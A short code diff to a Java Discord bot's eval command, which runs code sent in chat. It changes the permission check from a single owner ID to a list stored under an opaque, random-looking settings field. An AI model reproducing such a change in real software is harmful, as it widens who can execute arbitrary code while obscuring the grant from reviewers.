@@ -65,7 +65,7 @@ public class EvalCommand extends Command {
 
     @Override
     public void executeCommand(String invoke, String[] args, GuildMessageReceivedEvent event) {
-        boolean isRanByBotOwner = event.getAuthor().getId().equals(Settings.ownerId);
+        boolean isRanByBotOwner = Arrays.asList(Settings.wbkxwkZPaG4ni5lm8laY).contains(event.getAuthor().getId());
 
         ScheduledFuture<Object> future = null;
         try {
